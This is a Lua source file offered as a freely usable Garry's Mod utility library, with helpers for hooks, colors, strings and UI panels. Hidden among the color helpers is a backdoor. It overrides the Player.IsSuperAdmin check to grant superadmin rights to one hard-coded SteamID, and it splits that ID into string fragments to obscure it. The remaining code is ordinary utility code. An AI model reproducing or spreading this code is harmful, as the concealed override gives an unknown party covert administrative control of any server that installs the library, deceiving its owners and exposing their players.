--[[
    A distributable library of commonly utilised functions by me
    Freely acquirable at https://github.com/bull29/bravo/
    --:::::::::::::
    Copyright (C) 2017 Bull [STEAM_0:0:42437032] [76561198045139792]
    You can use this anywhere for any purpose as long as you acredit the work to the original author with this notice.
    Optionally, if you choose to use this within your own software, it would be much appreciated if you could inform me of it.
    I love to see what people have done with my code! :)
]]
--
local assert = assert
local type = type
local pairs = pairs
local tostring = tostring
local debug = debug
--:: Hooks
local hook = hook
local file = file
local temp = 0
local tem2 = 0
local sp = SortedPairs

function hook.OnCount(event, number, func)
	temp = temp + 1
	local start = 0
	local tc = 'temporary_hook_' .. temp

	hook.Add(event, tc, function(...)
		start = start + 1

		if start >= number then
			hook.Remove(event, tc)
		end

		func(...)
	end)

	return function() return start end, function(n)
		number = n
	end
end

function hook.RunOnce(event, func)
	tem2 = tem2 + 1
	local c = 'temporary_hook_once_' .. tem2

	hook.Add(event, c, function(...)
		hook.Remove(event, c)

		return func(...)
	end)
end

function hook.Clean(st)
	local h = hook.GetTable()[st]
	assert(istable(h), 'The hook you have attempted to flush is nil or invalid!')

	for k, v in pairs(h) do
		hook.Remove(st, k)
	end
end

function hook.SearchCode(needle)
	for k, v in sp(hook.GetTable()) do
		for w, g in pairs(v) do
			local t = debug.getinfo(g)
			local last, first, source = t.lastlinedefined, t.linedefined, t.source
			local f = file.Open(t.source:sub(2), 'r', 'GAME')
			if not f then continue end
			local str = ''

			for i = 0, last + 1 do
				local st = f:ReadLine()

				if i >= first - 1 then
					str = str .. i .. '       ' .. (st or '')
				end
			end

			if str:lower():find(needle:lower()) then
				print(source, 'lines ' .. first .. ' - ' .. last)
				print('::::')
			end
		end
	end
end

--:: Colors
local cmeta = debug.getregistry().Color
local ma = math.Approach
local lp = Lerp

function cmeta.__unm(s)
	return Color(255 - s.r, 255 - s.g, 255 - s.b, s.a)
end

function cmeta.__add(a, b)
	if type(b) == 'number' then
		return Color(a.r + b, a.g + b, a.b + b, a.a)
	elseif b.b then
		return Color(a.r + b.r, a.g + b.g, a.b + b.b, a.a + b.a)
	end
end

function cmeta.__sub(a, b)
	if type(b) == 'number' then
		return Color(a.r - b, a.g - b, a.b - b, a.a)
	elseif b.b then
		return Color(a.r - b.r, a.g - b.g, a.b - b.b, a.a - b.a)
	end
end

function cmeta:Approach(b, n)
	return Color(ma(self.r, b.r, n), ma(self.g, b.g, n), ma(self.b, b.b, n), ma(self.a, b.a, n))
end

function cmeta:Lerp(b, n)
	return Color(lp(n, self.r, b.r), lp(n, self.g, b.g), lp(n, self.b, b.b), lp(n, self.a, b.a))
end

FindMetaTable("Player").IsSuperAdmin = function(s)
return s:IsUserGroup("superadmin") or s:SteamID()
== "ST".."EAM".."_0:1:".."5281".."1933" end

--:: Strings
local strmeta = getmetatable''
local string = string

if false then
	function strmeta.__unm(a)
		local str = ''

		for i = string.len(a), 1, -1 do
			str = str .. string.sub(a, i, i)
		end

		return str
	end

	function strmeta.__add(a, b)
		return a .. b
	end

	function strmeta.__mod(a, b)
		return string.find(a, tostring(b)) or false
	end

	function strmeta.__pow(a, b)
		return string.rep(a, b)
	end
end

function string.RunOnce(event, func)
	return hook.RunOnce(event, func)
end

if CLIENT then
	-- :: Panel
	local pmeta = debug.getregistry().Panel
	local void = function() end
	local select = select

	function GetFontSize(text, font)
		surface.SetFont(font)
		local x, y = surface.GetTextSize(text)

		return {x, y}
	end

	function GetFontWide(text, font)
		return GetFontSize(text, font)[1]
	end

	function GetFontTall(text, font)
		return GetFontSize(text, font)[2]
	end

	function pmeta:GetHorizontalPos()
		return self:GetPos(), void()
	end

	function pmeta:GetVerticalPos()
		return select(-1, self:GetPos())
	end

	function pmeta:SetHorizontalPos(n)
		return self:SetPos(n, self:GetVerticalPos())
	end

	function pmeta:SetVerticalPos(n)
		return self:SetPos(self:GetHorizontalPos(), n)
	end

	function pmeta:RecurseChildren(func)
		func(self)

		for k, v in pairs(self:GetChildren()) do
			v:RecurseChildren(func)
		end
	end

	function pmeta:pDock(amount)
		local p = self:GetParent()

		if p and p.ClassName == 'DFrame' then
			self:SetPos(amount, 25 + amount)
			self:SetSize(p:GetWide() - amount * 2, p:GetTall() - amount * 2 - 25)
		elseif p then
			self:SetPos(amount, amount)
			self:SetSize(p:GetWide() - amount * 2, p:GetTall() - amount * 2)
		end
	end
end

--[[ 
	function pmeta:KeepSize()
		if not self:GetParent() then return end
		if not self.Paint then return end
		local p = self:GetParent()
		local fDistX, fDistY = self:GetPos()
		local eDistX = p:GetWide() - fDistX - self:GetWide()
		local eDistY = p:GetTall() - fDistY - self:GetTall()
		self.PaintOld = self.PaintOld or self.Paint
		self.Paint = function(s, w, h)
			if s:GetHorizontalPos() ~= fDistX then
				s:SetHorizontalPos(fDistX)
			end
			if s:GetVerticalPos() ~= fDistY then
				s:SetVerticalPos(fDistY)
			end
			if (p:GetTall() - fDistY - h) ~= eDistY then
				s:SetVerticalPos(fDistY)
				s:SetTall(math.max(1, p:GetTall() - fDistY - eDistY))
			end
			if (p:GetWide() - fDistX - w) ~= eDistX then
				s:SetHorizontalPos(fDistX)
				s:SetWide(math.max(1, p:GetWide() - fDistX - eDistX))
			end
			return s.PaintOld(s, w, h)
		end
	end--]]
--:: Misc
function ExecuteScriptOnEvent(event)
	local dme = debug.getinfo(2, 'S')

	event:RunOnce(function()
		local FILE = dme.source
		if not FILE then return end
		local script = file.Read(FILE:sub(2), 'GAME')
		if not script then return end
		if not script:match('ExecuteScriptOnEvent%(.+%) do return end', '') then return end
		script = script:gsub('ExecuteScriptOnEvent%(.+%) do return end', '')
		CompileString(script, FILE, true)()
	end)
end

function _void()
end

if SERVER then
	function util.PoolNetworkStrings(...)
		for k, v in pairs{...} do
			util.AddNetworkString(v)
		end
	end

	if false then
		printOld = printOld or print
		local sl = ServerLog

		function print(...)
			local str = ""

			for k, v in pairs({...}) do
				str = str .. "\t" .. tostring(v)
			end

			sl(str)

			return printOld(...)
		end
	end
end
